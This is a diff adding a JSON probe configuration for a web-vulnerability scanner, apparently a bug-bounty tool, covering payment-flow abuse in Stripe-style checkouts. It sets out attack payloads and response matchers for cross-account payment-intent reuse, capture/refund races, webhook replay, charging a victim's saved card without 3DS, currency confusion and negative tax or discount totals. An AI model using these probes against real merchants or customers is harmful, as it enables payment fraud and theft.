@@ -1,0 +1,154 @@
+{
+  "category": "payment_flow",
+  "description": "Payment flow abuse — Stripe / Square / PayPal / Adyen / Braintree integrations consistently yield $5k+ bounties. Common classes: payment_intent ID confusion, capture/refund races, webhook secret rotation, 3DS setup_intent reuse, idempotency-key per-customer scope, currency confusion, tax-zero exploits.",
+  "craft_guidance": [
+    "1. MAP THE FLOW: identify create_intent -> confirm -> capture -> webhook -> capture_settled. Each step is a race / replay / confusion target.",
+    "2. PROCESSOR FINGERPRINT: pi_/seti_/ch_ prefixes = Stripe; PAY-/EC- = PayPal; tok_ = Stripe legacy. Different processors have different idempotency / webhook semantics.",
+    "3. INTENT ID CROSS-ACCOUNT: capture intent A on attacker account and try to attribute it to victim's order. Server-side checks must verify (intent.customer == request.user).",
+    "4. AMOUNT MUTATION POST-CONFIRM: confirm $1, capture $1, but order metadata says $1000. Server-side capture/order amount mismatch = free order.",
+    "5. REFUND RACE: simultaneous refund + capture on same intent. Some apps debit account TWICE (once per call) before reconciling.",
+    "6. WEBHOOK SECRET ROTATION: Stripe allows two simultaneous secrets during rotation; both validate for ~24h. Old captured event + old secret = replayable into new system.",
+    "7. SETUP_INTENT REUSE: setup_intent (saving card for future) doesn't go through 3DS for subsequent uses. Capture victim's setup_intent (via OAuth scope or session leak), confirm new charge against it.",
+    "8. IDEMPOTENCY-KEY SCOPE: Stripe idempotency-key MUST be scoped to (account, key). Per-key scoping = same key, different account = duplicate-charge.",
+    "9. CURRENCY CONFUSION: order in USD, charge in IDR. 1 USD = 15000 IDR. Server stores 'price=1' regardless of currency = pay 1 IDR.",
+    "10. TAX/SHIPPING ZERO: app validates subtotal but not total. Set tax=-100 / shipping=-100 / discount=999 in update_intent calls."
+  ],
+  "contexts": {
+    "intent_id_cross_account": {
+      "description": "Reuse a payment_intent ID created by attacker on a victim's order. Server-side: order.charge = stripe.PaymentIntent.retrieve(client_provided_id). If app trusts the ID without verifying customer/amount/account, attacker pays $1 for a $1000 order.",
+      "tech_match": ["stripe", "payment_intent"],
+      "param_match": ["payment_intent_id", "intent_id", "stripe_intent", "client_secret", "transaction_id", "charge_id"],
+      "probes": [
+        {
+          "payload": "{\"order_id\":\"<victim_order>\",\"payment_intent_id\":\"<attacker_intent_pi_xxx>\"}",
+          "description": "Attach attacker's $1 payment_intent to victim's $1000 order. If accepted (200 + order_paid), no server-side amount/customer verification.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["paid", "confirmed", "success"]},
+            {"type": "not_word", "words": ["amount_mismatch", "customer_mismatch", "intent_not_owned"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "capture_refund_race": {
+      "description": "Capture and refund the SAME intent simultaneously. Some apps credit refund to the user's balance AND complete the order, netting attacker the goods + refunded money.",
+      "tech_match": ["stripe", "payment", "refund"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"intent_id\":\"<pi_xxx>\",\"action\":\"refund\"}",
+          "description": "Fire concurrent capture + refund (use test_race_condition). If both succeed and balance + order_paid both update, race confirmed.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["refund_id", "credited", "balance_increased"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {"concurrent_with": "capture"}
+        }
+      ]
+    },
+    "webhook_secret_rotation_race": {
+      "description": "During Stripe webhook secret rotation, BOTH old and new secrets validate for the rotation window (~24h). Captured webhook + old secret = replayable as legitimate.",
+      "tech_match": ["stripe", "webhook", "stripe-signature"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{captured_webhook_old_signature}}",
+          "description": "Replay a captured webhook signed with previous secret. If accepted within rotation window, attacker can manufacture events.",
+          "matchers": [
+            {"type": "status", "status": [200, 202]},
+            {"type": "not_word", "words": ["signature_invalid", "rotated"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"manual_capture": true}
+        }
+      ]
+    },
+    "setup_intent_reuse_no_3ds": {
+      "description": "setup_intent saves a card for future charges WITHOUT 3DS challenge. Attacker who captures victim's setup_intent (via OAuth scope leak or browser-extension exfil) charges victim's card without SCA.",
+      "tech_match": ["stripe", "setup_intent", "3ds"],
+      "param_match": ["setup_intent", "payment_method"],
+      "probes": [
+        {
+          "payload": "{\"setup_intent\":\"<seti_victim>\",\"amount\":1000,\"action\":\"charge\"}",
+          "description": "Charge using victim's setup_intent. 3DS not required; if 200, attacker bypassed SCA.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["succeeded", "charged"]},
+            {"type": "not_word", "words": ["3d_secure", "authentication_required"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "idempotency_key_cross_customer": {
+      "description": "Idempotency-Key MUST be scoped to (account, key, body-hash). Some integrations scope only to (key) — same key with different customer ID = duplicate charge attributed to attacker.",
+      "tech_match": ["stripe", "idempotency"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"customer\":\"<attacker_cust>\",\"amount\":1,\"currency\":\"usd\"}",
+          "description": "Send same idempotency-key with attacker customer first, then victim customer. If second returns first's response (attacker charged), scoping is broken.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["customer\":\"<attacker"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"extra_headers": {"Idempotency-Key": "swk_test_001"}}
+        }
+      ]
+    },
+    "currency_confusion": {
+      "description": "Order created in USD; charge created in low-value currency (IDR, VND). Server stores numeric price regardless of currency. 1 unit pays for 1 USD worth of goods.",
+      "tech_match": ["payment", "currency"],
+      "param_match": ["currency", "amount", "price"],
+      "probes": [
+        {
+          "payload": "{\"amount\":1,\"currency\":\"idr\",\"order_id\":\"<victim_usd_order>\"}",
+          "description": "Charge IDR amount on a USD order. If accepted and order_paid=true, currency normalization is broken.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["paid", "confirmed"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "tax_shipping_negative": {
+      "description": "App validates subtotal range (positive, < $X) but not tax / shipping / discount fields. Negative values flip the total.",
+      "tech_match": ["payment", "checkout"],
+      "param_match": ["tax", "shipping", "discount", "total"],
+      "probes": [
+        {
+          "payload": "{\"subtotal\":100,\"tax\":-99,\"shipping\":0,\"total\":1}",
+          "description": "Negative tax. If checkout accepts, total drops to $1 from $100.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["total\":1", "amount\":1"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"subtotal\":100,\"discount\":999}",
+          "description": "Discount exceeds subtotal — negative total. Some apps refund the difference.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["balance", "credit"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
